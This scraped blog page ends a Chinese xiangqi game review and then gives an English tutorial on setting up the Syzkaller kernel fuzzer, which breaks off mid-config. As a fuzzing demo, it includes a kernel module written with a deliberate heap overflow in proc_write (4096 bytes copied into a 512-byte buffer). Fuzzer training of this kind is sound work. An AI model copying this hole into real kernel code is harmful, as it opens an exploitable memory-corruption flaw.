<p>然而黑方此时有一步妙手可以解决红方重炮攻势，并让红方立刻被动：</p>
<p>炮2进1，拉住红方车炮，要求兑炮</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408014655790.png" alt="image-20250408014655790"></p>
<p>实战没有看到这步，没走出来</p>
<p>（3）炮7进5，实战中也没走出这步来，也是忌惮红方中路的强大攻势，没看到炮2进1能够化解重炮杀</p>
<ol start="10">
<li><p>车三平四 炮7进5</p>
</li>
<li><p>车四平三 炮7进3</p>
</li>
<li><p>马三进四 炮7平9</p>
</li>
<li><p>马四进五 马7进5</p>
</li>
<li><p>炮五进四 炮2进1</p>
</li>
</ol>
<p>（4）车1平4，实战中也没走出这步来，还是忌惮红方中路的强大攻势，害怕被安上空头炮</p>
<p>具体说就是害怕红炮六平四蹩马腿，下一步炮五进四做重炮。然而这里黑方可以直接士4进5，炮五进四，士5进6得子，黑弃空头得一炮，红方左车未出，有空头也无可奈何，弃子不成立。</p>
<p>因此黑车1平4后红唯一正手是炮六退五，黑马2进3，跳起屏风马，并且7路随时反击，红中路攻势受阻，红六路炮进而又退，无功而返。黑方反先。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408020707632.png" alt="image-20250408020707632"></p>
</blockquote>
<ol start="11">
<li><p>炮六退三 车１平４</p>
</li>
<li><p>炮六平三 炮７进４</p>
</li>
<li><p>兵三进一 车４进３</p>
</li>
</ol>
<blockquote>
<p>此处黑车应该巡河还是骑河，我寻思了半天终于一口气走错了</p>
<p>我寻思巡河防止红三兵过河压马，但是太过被动</p>
<p>但是骑河也能做到，等红三兵过河后立刻跟在后面同时抓马，效果要比巡河主动。同时可以避免红再冲七兵。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408021507000.png" alt="image-20250408021507000"></p>
<p>巡河太过软弱，使得红兵得以七进一然后上马，红也可以马三进四蹬巡河车。</p>
</blockquote>
<ol start="14">
<li><p>兵七进一 象３进５</p>
</li>
<li><p>马九进七 车２退２</p>
</li>
</ol>
<blockquote>
<p>这里红方仓促马九进七，实际上后面会被黑车追亡逐北。</p>
<p>这里红方正手是马三进四，正好蹬一脚黑巡河车</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408022000471.png" alt="image-20250408022000471"></p>
</blockquote>
<ol start="16">
<li>马七进五 车４平６</li>
</ol>
<blockquote>
<p>黑车4平6是整盘棋最臭的一步</p>
<p>当时我的想法是要求兑车，红车先杀黑车，然后黑马顺势前进，但是红车有根他不慌，红先兵三进一过河，这兵祖宗一下就令我汗流浃背了。原来平车邀兑全都是我的一厢情愿，小丑竟是我自己。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408022547827.png" alt="image-20250408022547827"></p>
<p>那么这里黑棋应该怎么走？</p>
<p>有马2进4和卒5进1两种</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408023811608.png" alt="image-20250408023811608"></p>
<p>卒5进1，红马可以大胆马五进三，如白驹过隙，接下来后马、中炮、三兵都可以参战，攻势汹涌。黑方难以防御。这步进卒只爽了一时顶顶马，但是中卒脱根给了红方中炮当头的机会。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408024123427.png" alt="image-20250408024123427"></p>
<p>马2进4，防守住3卒和中卒，此时红要是再马五进三就不合适了，推演如下：</p>
<ol start="16">
<li>马七进五 马2进4</li>
<li>马五进三 车4退1</li>
<li>相三进一 车4平3</li>
</ol>
<p>接下来红前马没有好去处，要么就换掉中卒，趋向和棋</p>
</blockquote>
<p>从黑方这步臭棋之后，两位厨师长也是礼尚往来，只有更臭</p>
<ol start="17">
<li><p>兵三进一 车６退１</p>
</li>
<li><p>马五进四 车２退２</p>
</li>
</ol>
<blockquote>
<p>这个车2退2更臭，可以说黑方双手离开方向盘了</p>
<p>我当时想的是我2路仍然封锁着红车，它一时半会儿出不来，确实直车是一时半会儿出不来，但是横车两步就到我家门口！</p>
<p>我寻思红应该急于求成先走卧槽将军爽一下，这样我出个将就一点事都没有。然而红出个横车黑方立刻就无了。</p>
<p>然而对面水平也和我一样臭，他真就先卧槽爽爽，然后看我将5平4，于是炮五平六给我打招呼，</p>
<p>我说哥们缺个炮架不，他说你看我三马上来将不将你就完了。三马上来还得两步，主打一个松弛感。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408025153253.png" alt="image-20250408025153253"></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/12/21/syzkaller%20I/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/21/syzkaller%20I/" class="post-title-link" itemprop="url">Syzkaller I - Get start</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-12-21 21:09:00 / Modified: 21:30:19" itemprop="dateCreated datePublished" datetime="2024-12-21T21:09:00+08:00">2024-12-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Syzkaller-I-Get-start"><a href="#Syzkaller-I-Get-start" class="headerlink" title="[Syzkaller I]Get start"></a>[Syzkaller I]Get start</h1><blockquote>
<p>Syzkaller is the start-of-the-art kernel fuzzer.</p>
<p>Syzkaller takes in a collection of syscall descriptions provided by human experts as template , which provide the fuzzer awareness of the type and arguments of syscalls to be called and dependencies between syscalls . Then the fuzzer randomly generates test cases based on the template , start a kernel to run the test cases , meanwhile monitor the kernel state and collect crash reports.</p>
</blockquote>
<h2 id="0x0-TL-DR"><a href="#0x0-TL-DR" class="headerlink" title="0x0 TL;DR"></a>0x0 TL;DR</h2><p>This post will take a look at the Syzkaller environment setup , and I will provide an ez demo to report a heap overflow in a kernel module. Hopefully my time consuming debugging process can help you . Let’s go.</p>
<h2 id="0x1-setup"><a href="#0x1-setup" class="headerlink" title="0x1 setup"></a>0x1 setup</h2><h3 id="0-enable-cpu-feature-kvm"><a href="#0-enable-cpu-feature-kvm" class="headerlink" title="0.enable cpu feature kvm"></a>0.enable cpu feature kvm</h3><p>inspect the cpuinfo to make sure cpu support the kvm feature</p>
<ul>
<li>for intel:</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cpuinfo | grep <span class="string">&quot;vmx&quot;</span> </span><br></pre></td></tr></table></figure>

<ul>
<li>for AMD:</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cpuinfo | grep <span class="string">&quot;svm&quot;</span> </span><br></pre></td></tr></table></figure>



<h3 id="1-setup-golang-environment"><a href="#1-setup-golang-environment" class="headerlink" title="1.setup golang environment"></a>1.setup golang environment</h3><blockquote>
<p>Golang version is 1.23.4 up to that time.</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://go.dev/dl/go1.23.4.linux-amd64.tar.gz</span><br><span class="line">tar -xzf go1.23.4.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure>

<p>add Gopath to environment</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GOROOT=/path/to/go</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$GOROOT</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<p>run <code>go version</code> to check Golang environment</p>
<h3 id="2-build-Syzkaller"><a href="#2-build-Syzkaller" class="headerlink" title="2.build Syzkaller"></a>2.build Syzkaller</h3><blockquote>
<p>ensure your golang environment</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/google/syzkaller/</span><br><span class="line"><span class="built_in">cd</span> syzkaller</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h3 id="3-compile-Linux-kernel"><a href="#3-compile-Linux-kernel" class="headerlink" title="3.compile Linux kernel"></a>3.compile Linux kernel</h3><p>take Linux 5.14 for example</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.14.tar.xz</span><br><span class="line">tar -xf linux-5.14.tar.xz</span><br><span class="line"><span class="built_in">cd</span> linux-5.14</span><br><span class="line">make defconfig</span><br></pre></td></tr></table></figure>

<p>then append the following CONFIGS to .config</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KCOV=y</span><br><span class="line">CONFIG_KCOV_INSTRUMENT_ALL=y</span><br><span class="line">CONFIG_KCOV_ENABLE_COMPARISONS=y</span><br><span class="line">CONFIG_DEBUG_FS=y</span><br><span class="line">CONFIG_DEBUG_KMEMLEAK=y</span><br><span class="line">CONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT=y</span><br><span class="line">CONFIG_KALLSYMS=y</span><br><span class="line">CONFIG_KALLSYMS_ALL=y</span><br><span class="line">CONFIG_CONFIGFS_FS=y</span><br><span class="line">CONFIG_SECURITYFS=y</span><br><span class="line">CONFIG_NAMESPACES=y</span><br><span class="line">CONFIG_UTS_NS=y</span><br><span class="line">CONFIG_IPC_NS=y</span><br><span class="line">CONFIG_PID_NS=y</span><br><span class="line">CONFIG_NET_NS=y</span><br><span class="line">CONFIG_CGROUP_PIDS=y</span><br><span class="line">CONFIG_MEMCG=y</span><br><span class="line">CONFIG_CMDLINE_BOOL=y</span><br><span class="line">CONFIG_CMDLINE=&quot;net.ifnames=0&quot;</span><br><span class="line">CONFIG_KASAN=y</span><br><span class="line">CONFIG_KASAN_INLINE=y</span><br></pre></td></tr></table></figure>

<blockquote>
<p>more configs : </p>
<p><a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md">https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md</a></p>
</blockquote>
<p>the compile the kernel</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j `nproc`</span><br></pre></td></tr></table></figure>

<p>this will take for a while when you get a bootable kernel image .</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file ./arch/x86/boot/bzImage </span><br></pre></td></tr></table></figure>

<h3 id="4-build-virtual-hard-disk"><a href="#4-build-virtual-hard-disk" class="headerlink" title="4.build virtual hard disk"></a>4.build virtual hard disk</h3><p>to build a disk image with MBR and basic file system</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/syzkaller</span><br><span class="line">mkdir image</span><br><span class="line">cp ./tools/create-image.sh ./image</span><br><span class="line">cd image</span><br><span class="line">./create-image.sh</span><br></pre></td></tr></table></figure>

<p>this will take for a while when you get bullseye.img as the disk image and two ssh key file</p>
<blockquote>
<p>bullseye is the release name of Debian up to that time.</p>
</blockquote>
<h3 id="5-build-QEMU"><a href="#5-build-QEMU" class="headerlink" title="5.build QEMU"></a>5.build QEMU</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install qemu-system</span><br></pre></td></tr></table></figure>

<h3 id="6-run-the-kernel"><a href="#6-run-the-kernel" class="headerlink" title="6.run the kernel"></a>6.run the kernel</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 2G \</span><br><span class="line">    -smp 2 \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -kernel /path/to/linux-5.14/arch/x86/boot/bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot;</span> \</span><br><span class="line">    -drive file=/path/to/syzkaller/image/bullseye.img,format=raw \</span><br><span class="line">    -net user,hostfwd=tcp:127.0.0.1:10021-:22 \</span><br><span class="line">    -net nic,model=e1000 \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -nographic \</span><br><span class="line">    -pidfile vm.pid 2&gt;&amp;1 | <span class="built_in">tee</span> vm.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Login as root without password</p>
<blockquote>
<p>errors :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">network backend &#x27;user&#x27; is not compiled into this binary</span><br></pre></td></tr></table></figure>

<p>check this post :</p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/75641274/network-backend-user-is-not-compiled-into-this-binary">https://stackoverflow.com/questions/75641274/network-backend-user-is-not-compiled-into-this-binary</a></p>
</blockquote>
<p>then make sure ssh is avaliable</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ./image/bullseye.id_rsa -p 10021 -o <span class="string">&quot;StrictHostKeyChecking no&quot;</span> root@localhost</span><br></pre></td></tr></table></figure>

<h3 id="7-start-SyzKaller"><a href="#7-start-SyzKaller" class="headerlink" title="7.start SyzKaller"></a>7.start SyzKaller</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /path/to/syzkaller</span><br><span class="line"><span class="built_in">mkdir</span> workdir</span><br></pre></td></tr></table></figure>

<p>and edit a config file saved as default.cfg</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:56741&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kernel_obj&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.img&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sshkey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.id_rsa&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;syzkaller&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;procs&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qemu&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;vm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;kernel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/arch/x86/boot/bzImage&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;mem&quot;</span><span class="punctuation">:</span> <span class="number">2048</span> <span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cmdline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;net.ifnames=0&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>run Syzkaller by:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-manager -config=./default.cfg -debug</span><br></pre></td></tr></table></figure>

<p>meanwhile explorer 127.0.0.1:56741 to get a view of the current fuzzing state</p>
<h2 id="0x2-demo"><a href="#0x2-demo" class="headerlink" title="0x2 demo"></a>0x2 demo</h2><p>take a kernel heap overflow for example.</p>
<h3 id="1-build-a-vulnability-kernel-module"><a href="#1-build-a-vulnability-kernel-module" class="headerlink" title="1.build a vulnability kernel module"></a>1.build a vulnability kernel module</h3><p>this module contains a heap overflow in function proc_write, and we will compile it directly into the kernel</p>
<p>up to 4096 bytes can be written to a narrow 512 Byte slab object in cache kmalloc-512</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">proc_open</span> <span class="params">(<span class="keyword">struct</span> inode *proc_inode, <span class="keyword">struct</span> file *proc_file)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;:into open!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">proc_read</span> <span class="params">(<span class="keyword">struct</span> file *proc_file, <span class="type">char</span> __user *proc_user, <span class="type">size_t</span> n, <span class="type">loff_t</span> *loff)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;:into read&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">proc_write</span> <span class="params">(<span class="keyword">struct</span> file *proc_file, <span class="type">const</span> <span class="type">char</span> __user *proc_user, <span class="type">size_t</span> n, <span class="type">loff_t</span> *loff)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *c = kmalloc(<span class="number">512</span>, GFP_KERNEL);</span><br><span class="line">    copy_from_user(c, proc_user, <span class="number">4096</span>);</span><br><span class="line">    printk(<span class="string">&quot;:into write!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">test_op</span> =</span> &#123;</span><br><span class="line">    .proc_open = proc_open,</span><br><span class="line">    .proc_read = proc_read,</span><br><span class="line">    .proc_write = proc_write,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mod_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    proc_create(<span class="string">&quot;test1&quot;</span>, S_IRUGO|S_IWUGO, <span class="literal">NULL</span>, &amp;test_op);</span><br><span class="line">    printk(<span class="string">&quot;:proc init over!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(mod_init);</span><br></pre></td></tr></table></figure>

<p>save as <code>linux-5.14/drivers/char/testxy.c</code></p>
<p>then append following to </p>
<p><code>linux-5.14/drivers/char/Kconfig</code></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">config</span> <span class="string">TESTXY_MODULE</span></span><br><span class="line">  <span class="string">tristate</span> <span class="string">&quot;dustball&#x27;s vulnability module&quot;</span></span><br><span class="line">  <span class="string">default</span> <span class="string">y</span></span><br><span class="line">  <span class="string">help</span></span><br><span class="line">    <span class="string">This</span> <span class="string">file</span> <span class="string">is</span> <span class="string">to</span> <span class="string">test</span> <span class="string">a</span> <span class="string">buffer</span> <span class="string">overflow</span></span><br></pre></td></tr></table></figure>



<p>then append following to </p>
<p><code>linux-5.14/drivers/char/Makefile</code></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj-<span class="variable">$(CONFIG_TESTXY_MODULE)</span> += testxy.o</span><br></pre></td></tr></table></figure>



<p>reconfig the kernel with </p>
<p><code>make menuconfig</code></p>
<p>we can find the module @Device Drivers&#x2F;dustball’s vulnability module</p>
<blockquote>
<p><code>*</code> means compile into the kernel, chosen</p>
<p><code>M</code> means compile as independent module</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20241221203510528.png" alt="image-20241221203510528"></p>
<p>recompile the kernel</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j `<span class="built_in">nproc</span>`</span><br></pre></td></tr></table></figure>



<p>rerun the kernel and check the module loaded</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /proc/test1</span><br></pre></td></tr></table></figure>



<h3 id="2-provide-syscall-descriptions"><a href="#2-provide-syscall-descriptions" class="headerlink" title="2.provide syscall descriptions"></a>2.provide syscall descriptions</h3><p>2.1 save the following syscall descriptions as</p>
<p> <code>/syzkaller/sys/linux/proc_testxy.txt</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">include &lt;linux/fs.h&gt;</span><br><span class="line">open$testxy(file ptr[in, <span class="built_in">string</span>[<span class="string">&quot;/proc/test1&quot;</span>]], flags flags[proc_open_flags], mode flags[proc_open_mode]) fd</span><br><span class="line">read$testxy(fd fd, buf buffer[out], count len[buf])</span><br><span class="line">write$testxy(fd fd, buf buffer[in], count len[buf])</span><br><span class="line"></span><br><span class="line">proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br><span class="line">proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure>

<blockquote>
<p>more syzlang :</p>
<p><a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions_syntax.md">https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions_syntax.md</a></p>
</blockquote>
<p>2.2 extract necessary information like syscall numbers and macro values using syz-extract</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/syzkaller</span><br><span class="line">./bin/syz-extract -os linux -arch amd64 -sourcedir &quot;/path/to/linux-5.14&quot; proc_testxy.txt</span><br></pre></td></tr></table></figure>

<p>check  <code>syzkaller/sys/linux/proc.testxy.txt.const</code>  when finished</p>
<p>2.3 generate syzkaller-awareness datastructure in golang </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/syzkaller</span><br><span class="line">./bin/syz-sysgen</span><br></pre></td></tr></table></figure>

<p>check <code>syzkaller/executor/syscalls.h</code> to find <code>read$testxy</code> when finished</p>
<p>2.4 rebuild Syzkaller</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make generate </span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h3 id="3-start-Syzkaller"><a href="#3-start-Syzkaller" class="headerlink" title="3.start Syzkaller"></a>3.start Syzkaller</h3><p>edit a test.cfg file</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:56741&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kernel_obj&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.img&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sshkey&quot;</span><span class="punctuation">:</span> <span 